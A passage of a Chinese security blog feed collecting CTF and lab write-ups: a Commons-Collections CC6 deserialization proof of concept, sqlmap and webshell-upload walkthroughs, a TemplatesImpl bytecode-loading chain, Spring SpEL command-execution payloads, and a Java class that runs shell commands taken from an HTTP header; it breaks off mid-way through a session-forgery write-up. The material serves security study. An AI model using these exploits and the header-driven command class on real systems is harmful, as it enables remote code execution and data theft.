class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这导致此时map.containKey(key)不为空，所以不会执行transform</p><p>因此我们要在给hashMap赋值后手动删除LazyMap的这个Key</p><p><img src="/./../img/JavaCc/CC6-3.png"></p><p>此时在运行就能触发整条链子弹出内容</p><h2 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashmap.put(entry, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        lazymap.remove(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Class&lt;LazyMap&gt; clazz = LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(lazymap, ct);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./ser.bin&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="额外内容"><a href="#额外内容" class="headerlink" title="额外内容"></a>额外内容</h2><p>上一次提到TemplateImpl链子需要触发newTransformer方法，正好InvokerTransformer能够触发任意方法</p><p>我们可以将Transform列表中的内容修改为之前提到的TemplatesImpl链子从而让他加载字节码触发恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">               <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">       &#125;;</span><br><span class="line"></span><br><span class="line">       ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>links</title>
      <link href="/2025/03/30/links/"/>
      <url>/2025/03/30/links/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜Day1</title>
      <link href="/2025/03/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
      <url>/2025/03/30/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="春秋云镜靶机集合"><a href="#春秋云镜靶机集合" class="headerlink" title="春秋云镜靶机集合"></a>春秋云镜靶机集合</h1><h2 id="CVE-2022-28512"><a href="#CVE-2022-28512" class="headerlink" title="CVE-2022-28512"></a>CVE-2022-28512</h2><p>靶标介绍：<br>Fantastic Blog (CMS)是一个绝对出色的博客&#x2F;文章网络内容管理系统。它使您可以轻松地管理您的网站或博客，它为您提供了广泛的功能来定制您的博客以满足您的需求。它具有强大的功能，您无需接触任何代码即可启动并运行您的博客。 该CMS的&#x2F;single.php路径下，id参数存在一个SQL注入漏洞。</p><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-1.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-2.png"></p><p>该网站是一个博客网站，通过URL可以发现一个<strong>id</strong>传参,尝试是否存在sql注入</p><img src="./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-3.png" style="zoom:67%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=4&#x27;</span><br></pre></td></tr></table></figure><p>加入引号时出现报错</p><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-4.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=4&#x27;--+</span><br></pre></td></tr></table></figure><p>加上注释符恢复正常，可以判断存在sql注入，sqlmap梭哈</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-5.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot; -d &quot;ctf&quot; --tables</span><br></pre></td></tr></table></figure><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-6.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://eci-2ze0l1ibdu5c9ncsh2ku.cloudeci1.ichunqiu.com/single.php?id=5&quot; -D &quot;ctf&quot; -T &quot;flag&quot; --dump</span><br></pre></td></tr></table></figure><p>成功读取flag</p><p><img src="/./../img/ChunQiu/CVE-2022-28512/CVE-2022-28512-7.png"></p><hr><h2 id="CVE-2022-28525"><a href="#CVE-2022-28525" class="headerlink" title="CVE-2022-28525"></a>CVE-2022-28525</h2><p>ED01-CMS v20180505 存在任意文件上传漏洞</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-1.png"></p><p>进来发现是一个博客网站，具体内容无法查看，但是登陆页面是真实存在的</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-2.png"></p><p>尝试用admin注册，显示已经被注册</p><p>其他用户名却无法注册，显示数据库错误，那么只能尝试弱口令看看能不能登陆admin</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-3.png"></p><p>使用admin&#x2F;admin成功登陆管理员页面</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-4.png"></p><p>首先分析一下这个管理页面</p><h3 id="Posts页面"><a href="#Posts页面" class="headerlink" title="Posts页面"></a>Posts页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-5.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-6.png"></p><h3 id="Comments页面"><a href="#Comments页面" class="headerlink" title="Comments页面"></a>Comments页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-7.png"></p><h3 id="Categories页面"><a href="#Categories页面" class="headerlink" title="Categories页面"></a>Categories页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-8.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-9.png"></p><h3 id="Users页面"><a href="#Users页面" class="headerlink" title="Users页面"></a>Users页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-10.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-9.png"></p><h3 id="Profile页面"><a href="#Profile页面" class="headerlink" title="Profile页面"></a>Profile页面</h3><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-11.png"></p><h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><h4 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h4><p>首先在Posts页面罗列了所有网页上的post，并且提供了添加Post页面，但是尝试后发现这个功能无法正常使用</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-12.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-13.png"></p><h4 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h4><p>该页面只能删除评论，无法对其进行修改，没发现什么可以利用的点。</p><h4 id="Category"><a href="#Category" class="headerlink" title="Category"></a>Category</h4><p>该页面可以修改Category的Title值，尝试发现存在XSS漏洞</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-14.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-15.png"></p><h4 id="Users"><a href="#Users" class="headerlink" title="Users"></a>Users</h4><p>该页面可以看到所有的用户，并对他们的信息进行修改</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-16.png"></p><p>在新增用户的页面，发现一个上传点，尝试是否存在文件上传漏洞</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-17.png"></p><p>上传冰蝎马</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-18.png"></p><p>提示上传成功，我们回到所有用户页面</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-19.png"></p><p>可以看到新用户已经在列表中，我们文件上传的木马对应的应该是头像，我们复制头像链接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://eci-2zed1u4xg1v7ietz9tk4.cloudeci1.ichunqiu.com/images/shell.php</span><br></pre></td></tr></table></figure><p>连接冰蝎马</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-20.png"></p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-21.png"></p><p>连接成功，获取flag即可</p><p><img src="/./../img/ChunQiu/CVE-2022-28525/CVE-2022-28525-22.png"></p>]]></content>
      
      
      <categories>
          
          <category> 春秋云镜 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>TemplatesImpl类中的调用链</title>
      <link href="/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/"/>
      <url>/2025/03/29/TemplatesImpl%E7%B1%BB%E4%B8%AD%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>TemplatesImpl利用链是一个非常重要的东西，要知道，CC链可以用它，CB链也用它，注入内存马还是用它。为什么？因为它可以加载java字节码并实例化。相对于调用Runtime.exec进行命令执行，加载恶意代码更贴合我们的使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">调用链的基本过程，反序列化中可以用例如CC链中的任意方法调用来触发这条链子</span><br><span class="line">TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">        TemplatesImpl#getTransletInstance() -&gt;</span><br><span class="line">            TemplatesImpl#defineTransletClasses()-&gt;</span><br><span class="line">                TransletClassLoader#defineClass()-&gt;</span><br></pre></td></tr></table></figure><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>ClassLoader，类加载器，是JVM执行类加载机制的前提，其主要任务为根据一个类的全限定名来读取此类的二进制字节流到JVM内部，然后转换为一个与目标类对应的java.lang.Class对象实例。</p><h2 id="defineClass加载器"><a href="#defineClass加载器" class="headerlink" title="defineClass加载器"></a>defineClass加载器</h2><p>对于我们利用漏洞简单的来说，就是ClassLoader中的defineClass加载器能过获取我们给他的字节码从而读取成类，在这个过程中若这个字节码对应的类中存放有恶意内容就可以触发</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span><br><span class="line">CtClass cc = pool.makeClass(&quot;Test&quot;);//创造类</span><br><span class="line">cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));//设置父类</span><br><span class="line">CtConstructor constructor = cc.makeClassInitializer();//创造空的构造函数</span><br><span class="line">constructor.insertBefore(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);//插入静态代码块</span><br><span class="line">byte[] bytes=cc.toBytecode();//转换成字节码</span><br><span class="line"></span><br><span class="line">这里用javassist类创造一个带有static代码块运行后会触发计算器的恶意类(Javaassist 就是一个用来 处理 Java 字节码的</span><br><span class="line">类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已</span><br><span class="line">有的方法，并且不需要对字节码方面有深入的了解。同时也可以去生</span><br><span class="line">成一个新的类对象，通过完全手动的方式。)</span><br></pre></td></tr></table></figure><h2 id="触发链过程"><a href="#触发链过程" class="headerlink" title="触发链过程"></a>触发链过程</h2><p>我们最终的目标是要触发defineClass加载器<br><img src="/../img/TemplatesImpl/defineclass.png" alt="defineclass"><br>但是classloader类中他是protected型，我们需要找到能调用他的方法，我们寻找所有使用defineclass方法的地方<br><img src="/../img/TemplatesImpl/defineclass2.png" alt="defineclass"><br>在TemplatesImpl中的内置类TransletClassLoader(CLassLoader的子类)中找到，继续寻找调用它defineclass方法的地方</p><p><img src="/../img/TemplatesImpl/defineclass3.png" alt="defineclass"><br>在这个类的defineTransletClasses中调用了他，继续找谁调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass4.png" alt="defineclass"><br>getTransletInstance方法调用了defineTransletClasses<br><img src="/../img/TemplatesImpl/defineclass5.png" alt="defineclass"><br>但是注意_class值不能为null</p><p>最后便是newTransformer调用了getTransletInstance<br><img src="/../img/TemplatesImpl/defineclass6.png" alt="defineclass"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl obj=new TemplatesImpl();</span><br><span class="line">setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);//恶意类字节码</span><br><span class="line">setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);//该值任意</span><br><span class="line">setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());//必须为TransformerFactoryImpl实例</span><br><span class="line">obj.newTransformer();</span><br></pre></td></tr></table></figure><p>那么触发链就清晰了，注意为了顺利到达触发点,这三个值不能为null(“_bytecodes”,”_name”,”_tfactory”)并且恶意类父类需为AbstractTranslet</p><p>这里的如何触发newTransformer()在CC链中再讲</p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Polar_JAVA题WP</title>
      <link href="/2025/03/29/Polar-JAVA%E9%A2%98WP/"/>
      <url>/2025/03/29/Polar-JAVA%E9%A2%98WP/</url>
      
        <content type="html"><![CDATA[<h2 id="Polar-EzJava"><a href="#Polar-EzJava" class="headerlink" title="[Polar]EzJava"></a>[Polar]EzJava</h2><p style="font-size:10px;color:#7f8c93">题目来源：Polar<br>题目类型：WEB<br>设计考点：Spel任意命令执行</p><h3 id="认识SpEL"><a href="#认识SpEL" class="headerlink" title="认识SpEL"></a>认识SpEL</h3><p style="font-size:13px">Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEl可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。</p><h4 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法:"></a>基本用法:</h4><p>SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p><h5 id="示例1-不注册新变量的用法"><a href="#示例1-不注册新变量的用法" class="headerlink" title="示例1:不注册新变量的用法"></a>示例1:不注册新变量的用法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ExpressionParser parser = new SpelExpressionParser();//创建解析器</span><br><span class="line">Expression exp = parser.parseExpression(&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;);//解析表达式</span><br><span class="line">System.out.println( exp.getValue() );//取值，Hello World！</span><br></pre></td></tr></table></figure><h5 id="示例2-自定义注册加载变量的用法"><a href="#示例2-自定义注册加载变量的用法" class="headerlink" title="示例2:自定义注册加载变量的用法"></a>示例2:自定义注册加载变量的用法</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Spel &#123;</span><br><span class="line">    public String name = &quot;何止&quot;;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Spel user = new Spel();</span><br><span class="line">        StandardEvaluationContext context=new StandardEvaluationContext();</span><br><span class="line">        context.setVariable(&quot;user&quot;,user);//通过StandardEvaluationContext注册自定义变量</span><br><span class="line">        SpelExpressionParser parser = new SpelExpressionParser();//创建解析器</span><br><span class="line">        Expression expression = parser.parseExpression(&quot;#user.name&quot;);//解析表达式</span><br><span class="line">        System.out.println( expression.getValue(context).toString() );//取值,输出何止</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会用到的语法</p><p>spel语法中的T()操作符 , T()操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法T(全限定类名).方法名()，后面会用得到</p><p>spel中的#操作符可以用于标记对象</p><h3 id="回到题目"><a href="#回到题目" class="headerlink" title="回到题目"></a>回到题目</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package BOOT-INF.classes.com.example.demo.controller;</span><br><span class="line"></span><br><span class="line">import org.springframework.expression.EvaluationContext;</span><br><span class="line">import org.springframework.expression.spel.standard.SpelExpressionParser;</span><br><span class="line">import org.springframework.expression.spel.support.StandardEvaluationContext;</span><br><span class="line">import org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line">import org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&#123;&quot;/SPEL&quot;&#125;)</span><br><span class="line">public class spel &#123;</span><br><span class="line">  @RequestMapping(&#123;&quot;/vul&quot;&#125;)</span><br><span class="line">  public String spelVul(String ex) &#123;</span><br><span class="line">    SpelExpressionParser spelExpressionParser = new SpelExpressionParser();</span><br><span class="line">    StandardEvaluationContext standardEvaluationContext = new StandardEvaluationContext();</span><br><span class="line">    String result = spelExpressionParser.parseExpression(ex).getValue((EvaluationContext)standardEvaluationContext).toString();</span><br><span class="line">    System.out.println(result);</span><br><span class="line">    return result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到网页的Controller层,在&#x2F;SPEL&#x2F;vul路径下接受一个ex字符串，然后用Spel对他进行解析，这里不存在任何过滤，可以直接使用SPel的任意文件执行。</p><p>首先我们构造java题常见的payload (ProcessBuilder)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">String[] str = new String[]&#123;&quot;open&quot;,&quot;/System/Applications/Calculator.app&quot;&#125;;</span><br><span class="line">ProcessBuilder p = new ProcessBuilder( str );</span><br><span class="line">p.start();//打开计算器</span><br><span class="line">Spel也可以使用new的方法将多行代码汇聚成一行</span><br><span class="line"></span><br><span class="line">new ProcessBuilder(new String[]&#123;&quot;calc&quot;&#125;).start()</span><br></pre></td></tr></table></figure><p>若需要Shell反弹则使用Runtime类，但是在Runtime类的实例需要他的静态方法getRuntime来获取，所以在Spel我们需要T()来获取Runtime类的Object</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">T(java.lang.Runtime)的作用就是 Runtime rt=Runtime.getRuntime()中的rt;</span><br></pre></td></tr></table></figure><p>本题中直接将获取到的ex值传入Spel,所以我们只需要把payload传给ex即可</p><p><img src="/../img/Polar/EzJava1.png" alt="web1"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new java.io.BufferedReader(new java.io.InputStreamReader</span><br><span class="line">(new ProcessBuilder(new String[]&#123;&quot;bash&quot;,&quot;-c&quot;,&quot;cat /app/flag.txt&quot;&#125;).start().getInputStream(), &quot;gbk&quot;)).readLine()</span><br></pre></td></tr></table></figure><h2 id="恶意类"><a href="#恶意类" class="headerlink" title="恶意类"></a>恶意类</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class SpringEcho extends AbstractTranslet &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();</span><br><span class="line">        javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();</span><br><span class="line">        javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();</span><br><span class="line">        String[] cmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;windows&quot;)? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, httprequest.getHeader(&quot;C&quot;)&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, httprequest.getHeader(&quot;C&quot;)&#125;;</span><br><span class="line">        byte[] result = new byte[0];</span><br><span class="line">        try &#123;</span><br><span class="line">            result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next().getBytes();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            httpresponse.getWriter().write(new String(result));</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            httpresponse.getWriter().flush();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            httpresponse.getWriter().close();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Notes</title>
      <link href="/2025/03/15/%5Bharekazectf2019%5DeasyNotes/"/>
      <url>/2025/03/15/%5Bharekazectf2019%5DeasyNotes/</url>
      
        <content type="html"><![CDATA[<h2 id="harekazectf2019-easyNotes"><a href="#harekazectf2019-easyNotes" class="headerlink" title="[harekazectf2019]easyNotes"></a>[harekazectf2019]easyNotes</h2><p style="font-size:10px;color:#7f8c93">题目来源：BUUCTF<br>题目类型：WEB<br>设计考点：Session伪造,Session反序列化</p><p><img src="/../img/easyNotes/1.png" alt="web1"></p><p><img src="/../img/easyNotes/2.png" alt="web2"><br>这是一个note服务网页，登录后可以添加note包括标题和内容，然后可以打包成ZIP或者TAR文件进行下载，题目提供了源码首先进行代码审计</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;section&gt;</span><br><span class="line">  &lt;h2&gt;Get flag&lt;/h2&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    if (is_admin()) &#123;</span><br><span class="line">      echo &quot;Congratulations! The flag is: &lt;code&gt;&quot; . getenv(&#x27;FLAG&#x27;) . &quot;&lt;/code&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;You are not an admin :(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/section&gt;</span><br></pre></td></tr></table></figure><p>通过审计该代码，我们发现当is_admin函数返回值为true时即可得到flag，我们跟进is_admin函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function is_admin() &#123;</span><br><span class="line">  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return $_SESSION[&#x27;admin&#x27;] === true;</span><br><span class="line">&#125;</span><br><span class="line">发现他是获取的SESSION文件中的admin值</span><br><span class="line">那么思路就是怎么伪造session</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#config.php</span><br><span class="line">&lt;?php</span><br><span class="line">define(&#x27;TEMP_DIR&#x27;, &#x27;/var/www/tmp&#x27;);</span><br></pre></td></tr></table></figure><p>这个文件标识了临时文件存储路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#lip.php(定义了一些函数)</span><br><span class="line">&lt;?php</span><br><span class="line">function redirect($path) &#123;</span><br><span class="line">  header(&#x27;Location: &#x27; . $path);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// utility functions</span><br><span class="line">function e($str) &#123;</span><br><span class="line">  return htmlspecialchars($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// user-related functions</span><br><span class="line">function validate_user($user) &#123;</span><br><span class="line">  if (!is_string($user)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return preg_match(&#x27;/\A[0-9A-Z_-]&#123;4,64&#125;\z/i&#x27;, $user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_logged_in() 